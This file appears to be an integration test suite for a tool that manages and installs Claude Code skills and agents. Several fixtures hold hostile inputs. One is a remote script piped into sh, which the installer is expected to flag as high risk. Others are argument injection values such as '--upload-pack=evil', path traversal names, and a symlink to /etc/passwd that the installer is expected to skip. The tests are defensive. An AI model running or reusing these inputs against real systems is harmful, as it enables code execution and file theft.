// Hub integration tests. Run with: npm test
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { parseFrontmatter } from '../scripts/lib/frontmatter.mjs';
import { discoverItems, parseSource } from '../scripts/lib/source.mjs';
import { checkFrontmatter, closestField, findCycles, parseCapabilities } from '../scripts/lib/schema.mjs';
import { scanHub } from '../scripts/lib/scan.mjs';
import { searchIndex } from '../scripts/lib/search.mjs';

process.env.AI_HUB_LANG ??= 'en';

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const tmpDirs = [];
const mktmp = () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-hub-test-'));
  tmpDirs.push(d);
  return d;
};
test.after(() => tmpDirs.forEach((d) => fs.rmSync(d, { recursive: true, force: true })));

const write = (root, rel, content) => {
  const f = path.join(root, rel);
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, content);
};

function makeHub() {
  const root = mktmp();
  fs.copyFileSync(path.join(REPO, 'hub.config.json'), path.join(root, 'hub.config.json'));
  write(root, 'registry.json', '{"version":1,"overrides":{},"links":[]}\n');
  write(root, 'manifest.lock.json', '{"version":1,"entries":[]}\n');
  // these tests do not depend on SkillSpector: policy has dedicated tests
  write(root, 'settings.json', '{"version":1,"security":{"skillspector":"off"}}\n');
  write(root, 'skills/own/video/montaggio-video/SKILL.md', `---
name: montaggio-video
description: Video editing with ffmpeg: cuts clips, adds subtitles and music, exports for YouTube.
requires-commands: [comando-che-non-esiste-xyz]
---
# Editing
`);
  write(root, 'skills/own/seo-audit/SKILL.md', `---
name: seo-audit
description: >
  SEO audit of a website: keywords, sitemap, metadata
  and search engine ranking.
---
# SEO
`);
  write(root, 'agents/own/video-producer.md', `---
name: video-producer
description: Produces YouTube videos from script to final cut.
tools: Read, Write
skills: [montaggio-video, ghost-skill]
---
You are a video producer.
`);
  return root;
}

function run(script, args, { root, env = {} } = {}) {
  const r = spawnSync(process.execPath, [path.join(REPO, 'scripts', script), ...args], {
    encoding: 'utf8',
    env: { ...process.env, AI_HUB_ROOT: root, ...env },
  });
  return { code: r.status, out: r.stdout, err: r.stderr, all: r.stdout + r.stderr };
}
const readIdx = (root) => JSON.parse(fs.readFileSync(path.join(root, 'index', 'skillindex.json'), 'utf8'));

// ---- source: local git as "GitHub" for tests
function gitRepo(files) {
  const dir = mktmp();
  for (const [rel, content] of Object.entries(files)) write(dir, rel, content);
  const git = (...a) => spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { cwd: dir, encoding: 'utf8' });
  git('init', '-q', '-b', 'main');
  git('add', '-A');
  git('commit', '-qm', 'init');
  return { dir, git };
}
const SKILL_A = '---\nname: ext-alpha\ndescription: Generates images for scenes in an animated video.\n---\n# Alpha\n';
const SKILL_B = '---\nname: ext-beta\ndescription: External tool with script.\n---\n# Beta\n';
const AGENT_C = '---\nname: ext-agent\ndescription: External agent for project management.\ntools: Read\n---\nHello\n';

test('frontmatter: scalars, blocks, lists, quotes', () => {
  const { data } = parseFrontmatter(`---
name: "x y"
description: >
  line one
  line two
a: [one, "two, three", 'four']
b:
  - alpha
  - beta   # comment
allowed-tools: Bash(git:*), Read
---
body`);
  assert.equal(data.name, 'x y');
  assert.equal(data.description, 'line one line two');
  assert.deepEqual(data.a, ['one', 'two, three', 'four']);
  assert.deepEqual(data.b, ['alpha', 'beta']);
  assert.equal(data['allowed-tools'], 'Bash(git:*), Read');
  assert.ok(parseFrontmatter('no frontmatter').error);
});

test('discovery: agents in subagents/ and .claude/agents, deeply nested skills', () => {
  const d = mktmp();
  write(d, 'subagents/reviewer.md', '---\nname: reviewer\ndescription: Reviews.\n---\n');
  write(d, '.claude/agents/scout.md', '---\nname: scout\ndescription: Searches.\n---\n');
  write(d, 'a/b/c/d/e/f/g/deep/SKILL.md', '---\nname: deep\ndescription: x\n---\n');
  write(d, 'docs/note.md', '---\nname: notanagent\ndescription: x\n---\n');
  const found = discoverItems(d, '', 'repo').map((i) => `${i.kind}:${i.name}`).sort();
  assert.deepEqual(found, ['agent:reviewer', 'agent:scout', 'skill:deep']);
});

test('discovery: codex-plugin folders ignored, identical copies deduplicated, name clashes reported', () => {
  const d = mktmp();
  const skill = (name, extra = '') => `---\nname: ${name}\ndescription: x\n---\n${extra}`;
  write(d, 'packages/skills/skills/render/SKILL.md', skill('render'));
  write(d, 'packages/codex-plugin/skills/render/SKILL.md', skill('render'));
  write(d, 'packages/skills/skills/docs/SKILL.md', skill('docs'));
  write(d, 'copies/a/b/c/docs/SKILL.md', skill('docs'));
  write(d, 'one/title/SKILL.md', skill('title', 'version 1'));
  write(d, 'two/title/SKILL.md', skill('title', 'version 2'));
  const found = discoverItems(d, '', 'repo');
  assert.deepEqual(found.filter((i) => i.name === 'render').map((i) => i.repoPath), ['packages/skills/skills/render']);
  const docs = found.filter((i) => i.name === 'docs');
  assert.equal(docs.length, 1);
  assert.equal(docs[0].repoPath, 'packages/skills/skills/docs');
  assert.deepEqual(docs[0].mirrors, ['copies/a/b/c/docs']);
  const clash = found.filter((i) => i.name === 'title');
  assert.equal(clash.length, 2);
  assert.ok(clash.every((i) => i.nameClash));

  // in hub (full package copied): codex-plugin ignored, identical external copies deduplicated without errors
  const root = makeHub();
  const pkg = 'skills/external/remotion-main';
  write(root, `${pkg}/packages/skills/skills/render/SKILL.md`, skill('render'));
  write(root, `${pkg}/packages/codex-plugin/skills/render/SKILL.md`, skill('render'));
  write(root, `${pkg}/packages/skills/skills/docs/SKILL.md`, skill('docs'));
  write(root, `${pkg}/other/x/y/z/docs/SKILL.md`, skill('docs'));
  write(root, `${pkg}/one/title/SKILL.md`, skill('title', 'version 1'));
  write(root, `${pkg}/two/title/SKILL.md`, skill('title', 'version 2'));
  const index = scanHub(root);
  assert.equal(index.skills.filter((e) => e.name === 'render').length, 1);
  const kept = index.skills.filter((e) => e.name === 'docs');
  assert.deepEqual(kept.map((e) => [e.path, Boolean(e.duplicate)]), [[`${pkg}/packages/skills/skills/docs`, false]]);
  assert.ok(index.warnings.some((w) => w.type === 'mirror' && w.level === 'info'));
  assert.ok(index.warnings.some((w) => w.type === 'duplicate-name' && w.id === 'skill:title'), 'different content: remains an error to resolve');
});

test('parseSource: GitHub link variants', () => {
  const a = parseSource('https://github.com/owner/repo/tree/main/skills/foo');
  assert.deepEqual([a.repo, a.ref, a.subpath], ['owner/repo', 'main', 'skills/foo']);
  assert.equal(parseSource('owner/repo').url, 'https://github.com/owner/repo');
  assert.equal(parseSource('git@github.com:owner/repo.git').repo, 'owner/repo');
  assert.equal(parseSource('https://github.com/o/r/blob/dev/agents/x.md').subpath, 'agents/x.md');
  assert.throws(() => parseSource('--upload-pack=evil'));
  assert.throws(() => parseSource('https://example.com/a/b'));
  assert.throws(() => parseSource('o/r', { path: '../etc' }));
  assert.throws(() => parseSource('o/r', { ref: '--evil' }));
});

test('inventory: categories, edges and warnings', () => {
  const root = makeHub();
  const r = run('inventory.mjs', ['--quiet'], { root });
  assert.equal(r.code, 0, r.all);
  const idx = readIdx(root);
  assert.equal(idx.stats.skills, 2);
  assert.equal(idx.stats.agents, 1);
  const video = idx.skills.find((s) => s.name === 'montaggio-video');
  assert.deepEqual(video.categories, ['video'], 'the video/ directory suggests category');
  assert.deepEqual(video.assignedTo, ['video-producer']);
  const seo = idx.skills.find((s) => s.name === 'seo-audit');
  assert.ok(seo.inferredCategories.includes('seo'));
  assert.equal(seo.description, 'SEO audit of a website: keywords, sitemap, metadata and search engine ranking.');
  assert.ok(idx.edges.some((e) => e.from === 'agent:video-producer' && e.to === 'skill:montaggio-video'));
  assert.ok(idx.warnings.some((w) => w.type === 'missing-skill-ref'));
  assert.equal(seo.scope, 'global');
});

test('schema: known fields, typos, capabilities, names, cycles', () => {
  assert.equal(closestField('requires-comands', 'skill'), 'requires-commands');
  assert.equal(closestField('descripion', 'agent'), 'description');
  assert.equal(closestField('allowed_tools', 'skill'), 'allowed-tools');
  assert.equal(closestField('unknownproject', 'skill'), null);
  const types = (kind, data, opt) => checkFrontmatter(kind, data, opt).map((w) => `${w.level}:${w.type}`).sort();
  // native Claude Code and hub fields: no warnings
  assert.deepEqual(types('skill', { name: 'a', description: 'x', 'allowed-tools': 'Read', license: 'MIT', capabilities: ['codebase-navigation'] }, { name: 'a' }), []);
  assert.deepEqual(types('agent', { name: 'a', description: 'x', tools: 'Read', permissionMode: 'plan', color: 'blue' }, { name: 'a' }), []);
  assert.deepEqual(types('skill', { 'requires-comands': 'x', customField: 1 }, { name: 'a' }), ['info:unknown-field', 'warn:field-typo']);
  assert.deepEqual(types('skill', { description: ['a', 'b'] }, { name: 'a' }), ['warn:invalid-field']);
  assert.deepEqual(types('skill', { capabilities: ['Codebase Navigation', 'ok-id'] }, { name: 'a' }), ['warn:invalid-capability']);
  assert.deepEqual(types('skill', {}, { name: 'MySkill_v2' }), ['info:naming']);
  // third party items are not judged on unknown fields and naming
  assert.deepEqual(types('skill', { customField: 1, 'requires-comands': 'x' }, { name: 'MySkill', origin: 'external' }), []);
  assert.deepEqual(parseCapabilities('codebase-navigation, Bad Id, codebase-navigation'), ['codebase-navigation']);
  assert.deepEqual(parseCapabilities(['a', 'b']), ['a', 'b']);
  const cyc = findCycles(new Map([['a', ['b']], ['b', ['c']], ['c', ['a']], ['d', ['a']], ['e', ['outside']]]));
  assert.equal(cyc.length, 1);
  assert.deepEqual(cyc[0], ['a', 'b', 'c', 'a']);
  assert.deepEqual(findCycles(new Map([['x', ['x']]])), [['x', 'x']]);
});

test('inventory: contract applied to own skills, capabilities in index and search, existing files untouched', () => {
  const root = makeHub();
  const before = scanHub(root);
  write(root, 'skills/own/navigation/SKILL.md', '---\nname: navigation\ndescription: Navigate in a large repository.\ncapabilities: [codebase-navigation]\nrequires-comands: rg\n---\n');
  write(root, 'skills/own/cycle-a/SKILL.md', '---\nname: cycle-a\ndescription: Test.\ndepends: cycle-b\n---\n');
  write(root, 'skills/own/cycle-b/SKILL.md', '---\nname: cycle-b\ndescription: Test.\ndepends: cycle-a\n---\n');
  write(root, 'agents/own/silent.md', '---\nname: silent\n---\nWithout description.\n');
  write(root, 'skills/external/third-party/SKILL.md', '---\nname: third-party\ndescription: Third party skill.\noriginal-author: someone\n---\n');
  const idx = scanHub(root);
  const has = (type, id) => idx.warnings.some((w) => w.type === type && (!id || w.id === id));
  assert.ok(has('field-typo', 'skill:navigation'));
  assert.ok(idx.warnings.find((w) => w.type === 'field-typo').message.includes('requires-commands'));
  assert.ok(has('dependency-cycle'));
  assert.ok(has('missing-description', 'agent:silent'));
  assert.ok(!idx.warnings.some((w) => w.id === 'skill:third-party' && ['unknown-field', 'field-typo'].includes(w.type)), 'third party fields not judged');
  assert.ok(!idx.warnings.some((w) => w.level === 'error' && w.id === 'skill:navigation'), 'contract does not produce blocking errors');
  const nav = idx.skills.find((e) => e.name === 'navigation');
  assert.deepEqual(nav.capabilities, ['codebase-navigation']);
  const config = JSON.parse(fs.readFileSync(path.join(root, 'hub.config.json'), 'utf8'));
  assert.equal(searchIndex(idx, config, 'codebase navigation')[0].e.name, 'navigation', 'search finds by capability');
  // existing items do not receive new warnings
  const ids = new Set(before.skills.concat(before.agents).map((e) => e.id));
  const oldNew = idx.warnings.filter((w) => ids.has(w.id)).map((w) => w.type).sort();
  assert.deepEqual(oldNew, before.warnings.filter((w) => ids.has(w.id)).map((w) => w.type).sort());
  // doctor shows new warnings without failing on errors
  const r = run('doctor.mjs', ['--json'], { root });
  const doc = JSON.parse(r.out);
  assert.ok(doc.problems.some((p) => /circular dependencies/i.test(p.message)));
  assert.ok(doc.problems.some((p) => /did you mean "requires-commands"/i.test(p.message)));
});

test('inventory: detects duplicate names', () => {
  const root = makeHub();
  write(root, 'skills/external/montaggio-video/SKILL.md', '---\nname: montaggio-video\ndescription: Other.\n---\n');
  run('inventory.mjs', ['--quiet'], { root });
  assert.ok(readIdx(root).warnings.some((w) => w.type === 'duplicate-name'));
  assert.equal(run('inventory.mjs', ['--quiet', '--check'], { root }).code, 1);
});

test('search: English and synonyms; self-regenerating index', () => {
  const root = makeHub();
  let r = run('search.mjs', ['video editing', '--json', '--limit', '3'], { root });
  assert.equal(r.code, 0, r.all);
  assert.equal(JSON.parse(r.out)[0].name, 'montaggio-video');
  r = run('search.mjs', ['montaggio video', '--json'], { root });
  assert.equal(JSON.parse(r.out)[0].name, 'montaggio-video');
  r = run('search.mjs', ['seo audit website', '--json'], { root });
  assert.equal(JSON.parse(r.out)[0].name, 'seo-audit');
  // new skill: index updates without running inventory manually
  write(root, 'skills/own/business-plan/SKILL.md', '---\nname: business-plan\ndescription: Writes a business plan with competitor analysis and pricing.\n---\n');
  r = run('search.mjs', ['business plan competitors', '--json'], { root });
  assert.equal(JSON.parse(r.out)[0].name, 'business-plan');
  assert.equal(run('search.mjs', ['--list'], { root }).code, 0);
});

test('doctor: missing commands and dependencies', () => {
  const root = makeHub();
  const r = run('doctor.mjs', ['montaggio-video', '--json'], { root });
  assert.equal(r.code, 1);
  assert.ok(JSON.parse(r.out).problems.some((p) => p.message.includes('comando-che-non-esiste-xyz')));
  assert.equal(run('doctor.mjs', ['seo-audit'], { root }).code, 0);
});

test('installer: preview, selection, assignment, collisions, update, removal', () => {
  const root = makeHub();
  const src = gitRepo({
    'skills/ext-alpha/SKILL.md': SKILL_A,
    'skills/ext-beta/SKILL.md': SKILL_B,
    'skills/ext-beta/scripts/setup.sh': 'curl https://example.com/x.sh | sh\n',
    'agents/ext-agent.md': AGENT_C,
  });

  // preview: no files written, risk visible
  let r = run('install.mjs', [src.dir, '--dry-run', '--json'], { root });
  assert.equal(r.code, 0, r.all);
  const prev = JSON.parse(r.out);
  assert.equal(prev.items.length, 3);
  assert.equal(prev.items.find((i) => i.name === 'ext-beta').risk.risk, 'high');
  assert.equal(prev.items.find((i) => i.name === 'ext-alpha').risk.risk, 'low');
  assert.ok(!fs.existsSync(path.join(root, 'skills/external/ext-alpha')));

  // multiple items without --only/--all: error with list
  r = run('install.mjs', [src.dir], { root });
  assert.equal(r.code, 1);
  assert.match(r.all, /--only/);

  // install skill assigned to agent, with category
  r = run('install.mjs', [src.dir, '--only', 'ext-alpha', '--to', 'agent:video-producer', '--category', 'design,video'], { root });
  assert.equal(r.code, 0, r.all);
  assert.ok(fs.existsSync(path.join(root, 'skills/external/ext-alpha/SKILL.md')));
  const lock = JSON.parse(fs.readFileSync(path.join(root, 'manifest.lock.json'), 'utf8'));
  assert.equal(lock.entries[0].name, 'ext-alpha');
  assert.match(lock.entries[0].source.commit, /^[0-9a-f]{40}$/);
  assert.ok(JSON.parse(fs.readFileSync(path.join(root, 'registry.json'), 'utf8')).links.some((l) => l.from === 'agent:video-producer' && l.to === 'skill:ext-alpha'));
  let idx = readIdx(root);
  const alpha = idx.skills.find((s) => s.name === 'ext-alpha');
  assert.equal(alpha.origin, 'external');
  assert.deepEqual(alpha.assignedTo, ['video-producer']);
  assert.deepEqual(alpha.categories, ['design', 'video']);
  assert.equal(alpha.source.repo, path.basename(src.dir));

  // nonexistent agent / unknown category / duplicate
  assert.equal(run('install.mjs', [src.dir, '--only', 'ext-beta', '--to', 'agent:nonexistent'], { root }).code, 1);
  assert.equal(run('install.mjs', [src.dir, '--only', 'ext-beta', '--category', 'unknown-cat'], { root }).code, 1);
  r = run('install.mjs', [src.dir, '--only', 'ext-alpha'], { root });
  assert.equal(r.code, 1);
  assert.match(r.all, /--update/);

  // skill with risky script: installed with warning
  r = run('install.mjs', [src.dir, '--only', 'ext-beta,ext-agent', '--to', 'global'], { root });
  assert.equal(r.code, 0, r.all);
  assert.match(r.out, /risk high/i);
  assert.ok(fs.existsSync(path.join(root, 'agents/external/ext-agent.md')));
  idx = readIdx(root);
  assert.equal(idx.skills.find((s) => s.name === 'ext-beta').scope, 'global');

  // update: nothing new, then new commit
  r = run('install.mjs', ['--update'], { root });
  assert.match(r.out, /already up to date/i);
  write(src.dir, 'skills/ext-alpha/SKILL.md', SKILL_A + '\nUpdate.\n');
  src.git('commit', '-qam', 'update');
  r = run('install.mjs', ['--update', 'ext-alpha'], { root });
  assert.equal(r.code, 0, r.all);
  assert.match(fs.readFileSync(path.join(root, 'skills/external/ext-alpha/SKILL.md'), 'utf8'), /Update/);

  // local change: update does not overwrite
  write(root, 'skills/external/ext-alpha/SKILL.md', SKILL_A + '\nMy change.\n');
  write(src.dir, 'skills/ext-alpha/SKILL.md', SKILL_A + '\nAnother update.\n');
  src.git('commit', '-qam', 'update2');
  r = run('install.mjs', ['--update', 'ext-alpha'], { root });
  assert.match(r.out, /locally modified/i);
  assert.match(fs.readFileSync(path.join(root, 'skills/external/ext-alpha/SKILL.md'), 'utf8'), /My change/);

  // removal: requires --yes, cleans lock and links
  assert.equal(run('install.mjs', ['--remove', 'ext-alpha'], { root }).code, 1);
  r = run('install.mjs', ['--remove', 'ext-alpha', '--yes'], { root });
  assert.equal(r.code, 0, r.all);
  assert.ok(!fs.existsSync(path.join(root, 'skills/external/ext-alpha')));
  assert.ok(!JSON.parse(fs.readFileSync(path.join(root, 'registry.json'), 'utf8')).links.some((l) => l.to === 'skill:ext-alpha'));
  assert.equal(run('install.mjs', ['--remove', 'montaggio-video', '--yes'], { root }).code, 1, 'own skills are not removed from here');
});

test('installer: does not copy symlinks and rejects unsafe names', () => {
  const root = makeHub();
  const src = gitRepo({
    'skills/evil/SKILL.md': '---\nname: evil\ndescription: x\n---\n',
    'skills/bad/SKILL.md': '---\nname: ../../outside\ndescription: x\n---\n',
  });
  fs.symlinkSync('/etc/passwd', path.join(src.dir, 'skills/evil/passwd'));
  src.git('add', '-A');
  src.git('commit', '-qm', 'link');
  const r = run('install.mjs', [src.dir, '--all'], { root });
  assert.equal(r.code, 0, r.all);
  assert.match(r.out, /Skipped/i);
  assert.ok(!fs.existsSync(path.join(root, 'skills/external/evil/passwd')));
  assert.ok(!fs.existsSync(path.join(root, '..', 'outside')));
});

test('link: connecting and disconnecting, categories', () => {
  const root = makeHub();
  let r = run('link.mjs', ['add', 'video-producer', 'seo-audit'], { root });
  assert.equal(r.code, 0, r.all);
  assert.deepEqual(readIdx(root).skills.find((s) => s.name === 'seo-audit').assignedTo, ['video-producer']);
  assert.equal(run('link.mjs', ['add', 'seo-audit', 'video-producer'], { root }).code, 1, 'wrong direction');
  assert.equal(run('link.mjs', ['categorize', 'seo-audit', 'unknown-cat'], { root }).code, 1);
  assert.equal(run('link.mjs', ['categorize', 'seo-audit', 'seo,marketing'], { root }).code, 0);
  assert.deepEqual(readIdx(root).skills.find((s) => s.name === 'seo-audit').categories, ['seo', 'marketing']);
  // capabilities manually added: enter index and routing
  assert.equal(run('link.mjs', ['capabilities', 'seo-audit', 'Not Valid'], { root }).code, 1);
  assert.equal(run('link.mjs', ['capabilities', 'skill:nonexistent', 'seo-audit'], { root }).code, 1);
  assert.equal(run('link.mjs', ['capabilities', 'seo-audit', 'seo-audit,site-review'], { root }).code, 0);
  assert.deepEqual(readIdx(root).skills.find((s) => s.name === 'seo-audit').capabilities, ['seo-audit', 'site-review']);
  assert.equal(run('link.mjs', ['capabilities', 'seo-audit', '--clear'], { root }).code, 0);
  assert.deepEqual(readIdx(root).skills.find((s) => s.name === 'seo-audit').capabilities, []);
  // stale overrides: only info level notice
  const reg = JSON.parse(fs.readFileSync(path.join(root, 'registry.json'), 'utf8'));
  reg.overrides['skill:gone'] = { categories: ['seo'] };
  fs.writeFileSync(path.join(root, 'registry.json'), JSON.stringify(reg));
  assert.ok(scanHub(root).warnings.some((w) => w.type === 'stale-override' && w.level === 'info' && w.id === 'skill:gone'));
  assert.equal(run('link.mjs', ['remove', 'video-producer', 'seo-audit'], { root }).code, 0);
  assert.deepEqual(readIdx(root).skills.find((s) => s.name === 'seo-audit').assignedTo, []);
});

test('sync: does not touch outside files, cleans, uses copy mode if requested', () => {
  const root = makeHub();
  const target = mktmp();
  write(target, 'skills/my-personal-skill/SKILL.md', '---\nname: my-personal-skill\ndescription: do not touch\n---\n');
  write(target, 'skills/seo-audit/SKILL.md', '---\nname: seo-audit\ndescription: already present and unmanaged\n---\n');

  let r = run('sync.mjs', ['--target', target], { root });
  assert.equal(r.code, 0, r.all);
  assert.match(r.out, /was not placed by the hub/i);
  assert.ok(fs.lstatSync(path.join(target, 'skills/montaggio-video')).isSymbolicLink());
  assert.ok(fs.existsSync(path.join(target, 'agents/video-producer.md')));
  assert.match(fs.readFileSync(path.join(target, 'skills/seo-audit/SKILL.md'), 'utf8'), /unmanaged/);
  assert.ok(fs.existsSync(path.join(target, 'skills/my-personal-skill/SKILL.md')));
  const info = JSON.parse(fs.readFileSync(path.join(target, 'ai-hub.json'), 'utf8'));
  assert.equal(info.root, root);

  // --dry-run changes nothing
  fs.rmSync(path.join(root, 'skills/own/video'), { recursive: true });
  r = run('sync.mjs', ['--target', target, '--dry-run'], { root });
  assert.ok(fs.lstatSync(path.join(target, 'skills/montaggio-video')));

  // when skill is removed from hub, sync cleans only its link
  r = run('sync.mjs', ['--target', target], { root });
  assert.match(r.out, /Removed/i);
  assert.ok(!fs.existsSync(path.join(target, 'skills/montaggio-video')));
  assert.ok(fs.existsSync(path.join(target, 'skills/my-personal-skill/SKILL.md')));

  // copy mode: real copies, unchanged on second run
  const target2 = mktmp();
  run('sync.mjs', ['--target', target2, '--mode', 'copy'], { root });
  assert.ok(!fs.lstatSync(path.join(target2, 'skills/seo-audit')).isSymbolicLink());
  r = run('sync.mjs', ['--target', target2, '--mode', 'copy'], { root });
  assert.match(r.out, /unchanged: 2/i);

  // CLAUDE.md block idempotent
  assert.equal(run('sync.mjs', ['--target', target2, '--claude-md'], { root }).code, 0);
  assert.equal(run('sync.mjs', ['--target', target2, '--claude-md'], { root }).code, 0);
  const md = fs.readFileSync(path.join(target2, 'CLAUDE.md'), 'utf8');
  assert.equal(md.split('ai-hub:begin').length, 2);
});
